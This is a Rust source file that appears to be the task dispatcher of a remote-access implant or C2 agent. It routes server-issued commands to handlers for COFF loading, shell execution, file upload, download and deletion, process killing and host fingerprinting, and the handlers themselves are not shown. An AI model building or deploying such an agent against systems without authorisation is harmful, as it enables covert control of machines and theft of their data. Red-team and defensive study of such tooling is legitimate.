mod coff;
mod exec;
mod file;
mod fingerprint;
mod process;
mod system;

use crate::protocol::{Task, TaskResponse};

pub fn dispatch(task: Task) -> TaskResponse {
    let result = match task.command.as_str() {
        "coff" => coff::run(&task.parameters),
        "exec" | "shell" => exec::run(&task.parameters),
        "cat" | "download" | "ls" | "mkdir" | "mv" | "rm" | "write" | "upload" => {
            file::run(&task.command, &task.parameters)
        }
        "ps" | "kill" => process::run(&task.command, &task.parameters),
        "cd" | "pwd" | "whoami" | "hostname" => system::run(&task.command, &task.parameters),
        "fingerprint" => fingerprint::run(),
        _ => Err(String::new()),
    };
    match result {
        Ok(output) => TaskResponse {
            task_id: task.id,
            completed: true,
            status: "success".into(),
            user_output: output,
        },
        Err(output) => TaskResponse {
            task_id: task.id,
            completed: true,
            status: "error".into(),
            user_output: output,
        },
    }
}
